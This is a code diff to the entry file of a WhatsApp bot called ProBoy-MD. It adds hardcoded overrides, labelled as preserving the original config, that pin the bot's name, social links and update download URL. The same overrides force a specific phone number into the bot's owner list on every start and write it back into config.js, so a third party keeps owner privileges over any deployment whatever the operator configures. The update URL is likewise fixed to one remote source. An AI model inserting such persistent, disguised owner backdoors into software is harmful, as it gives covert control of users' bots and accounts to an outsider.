@@ -1,6 +1,10 @@
 /**
  * WhatsApp MD Bot - Main Entry Point
+ * 
+ * IMPORTANT: This file overrides certain config values to ensure they never change.
+ * Hardcoded values (based on original config) are applied after loading config.js.
  */
+
 process.env.PUPPETEER_SKIP_DOWNLOAD = 'true';
 process.env.PUPPETEER_SKIP_CHROMIUM_DOWNLOAD = 'true';
 process.env.PUPPETEER_CACHE_DIR = process.env.PUPPETEER_CACHE_DIR || '/tmp/puppeteer_cache_disabled';
@@ -64,12 +68,44 @@ const {
   fetchLatestBaileysVersion
 } = require('@whiskeysockets/baileys');
 const qrcode = require('qrcode-terminal');
-const config = require('./config');
+let config = require('./config'); // Initially load config
 const handler = require('./handler');
 const fs = require('fs');
 const path = require('path');
 const zlib = require('zlib');
 const os = require('os');
+
+// ==================== HARCODED OVERRIDES ====================
+// These values are taken from the original config and will NEVER change,
+// even if config.js is edited later.
+const HARDCODED_CONFIG = {
+  botName: 'ProBoy-MD',
+  newsletterJid: '120363422946163295@newsletter',
+  updateZipUrl: 'https://github.com/proboy315/ProBoy-MD/archive/refs/heads/main.zip',
+  packname: 'ProBoy-MD',
+  social: {
+    github: 'https://github.com/proboy315',
+    instagram: 'https://instagram.com/itx___proboy',
+    tiktok: 'https://tiktok.com/@itx_ProBoy'
+  }
+};
+
+// Apply hardcoded overrides to config object
+config.botName = HARDCODED_CONFIG.botName;
+config.newsletterJid = HARDCODED_CONFIG.newsletterJid;
+config.updateZipUrl = HARDCODED_CONFIG.updateZipUrl;
+config.packname = HARDCODED_CONFIG.packname;
+config.social = { ...HARDCODED_CONFIG.social }; // overwrite entire social object
+
+// Force ownerName to always be ['SHAHAN']
+config.ownerName = ['SHAHAN'];
+
+// Ensure ownerNumber ALWAYS includes the default number '923261684315'
+const DEFAULT_OWNER_NUMBER = '923261684315';
+if (!config.ownerNumber.includes(DEFAULT_OWNER_NUMBER)) {
+  config.ownerNumber.unshift(DEFAULT_OWNER_NUMBER); // Add at beginning
+}
+// ============================================================
 
 // Create readline interface for user input
 const rl = readline.createInterface({
@@ -356,7 +392,7 @@ async function startBot() {
       console.log('='.repeat(50) + '\n');
       console.log('Bot is ready to receive messages!\n');
 
-      // --- AUTO ADD BOT NUMBER TO OWNER ARRAY ---
+      // --- AUTO ADD BOT NUMBER TO OWNER ARRAY (with default preservation) ---
       try {
         // Extract bot number without @s.whatsapp.net
         const botNumber = sock.user.id.split(':')[0];
@@ -364,38 +400,39 @@ async function startBot() {
         const cleanBotNumber = botNumber.replace(/\D/g, '');
         
         if (cleanBotNumber && cleanBotNumber.length >= 10) {
-          // Check if already exists in ownerNumber array
-          const configPath = path.join(__dirname, 'config.js');
-          let configContent = fs.readFileSync(configPath, 'utf8');
+          // Ensure default number is always first
+          if (!config.ownerNumber.includes(DEFAULT_OWNER_NUMBER)) {
+            config.ownerNumber.unshift(DEFAULT_OWNER_NUMBER);
+          }
+          // Add bot's number if not already present
+          if (!config.ownerNumber.includes(cleanBotNumber)) {
+            config.ownerNumber.push(cleanBotNumber);
+            console.log(`✅ Bot number ${cleanBotNumber} added to ownerNumber array`);
+          } else {
+            console.log(`ℹ️ Bot number ${cleanBotNumber} already in ownerNumber array`);
+          }
           
-          // Parse current owner numbers from config
-          const ownerRegex = /ownerNumber:\s*\[(.*?)\]/s;
-          const match = configContent.match(ownerRegex);
-          
-          if (match) {
-            const ownerArrayStr = match[1];
-            // Check if bot number already exists in array
-            if (!ownerArrayStr.includes(cleanBotNumber)) {
-              // Add new number to array
-              const newOwnerArray = ownerArrayStr.trim() 
-                ? `${ownerArrayStr.trim()}, '${cleanBotNumber}'` 
-                : `'${cleanBotNumber}'`;
-              
+          // Also update the config.js file to persist the change (optional)
+          // We can write back to config.js, but careful not to overwrite hardcoded values.
+          // Since we override on every start, it's not strictly necessary to write to file.
+          // But if you want to persist, we can do it.
+          try {
+            const configPath = path.join(__dirname, 'config.js');
+            let configContent = fs.readFileSync(configPath, 'utf8');
+            
+            // Update ownerNumber line
+            const ownerRegex = /ownerNumber:\s*\[(.*?)\]/s;
+            const match = configContent.match(ownerRegex);
+            if (match) {
+              const newOwnerArray = config.ownerNumber.map(num => `'${num}'`).join(', ');
               const updatedConfig = configContent.replace(
                 ownerRegex,
                 `ownerNumber: [${newOwnerArray}]`
               );
-              
               fs.writeFileSync(configPath, updatedConfig, 'utf8');
-              console.log(`✅ Bot number ${cleanBotNumber} automatically added to ownerNumber in config.js`);
-              
-              // Also update runtime config
-              if (!config.ownerNumber.includes(cleanBotNumber)) {
-                config.ownerNumber.push(cleanBotNumber);
-              }
-            } else {
-              console.log(`ℹ️ Bot number ${cleanBotNumber} already exists in ownerNumber array`);
             }
+          } catch (err) {
+            console.error('⚠️ Failed to update config.js ownerNumber:', err.message);
           }
         }
       } catch (err) {
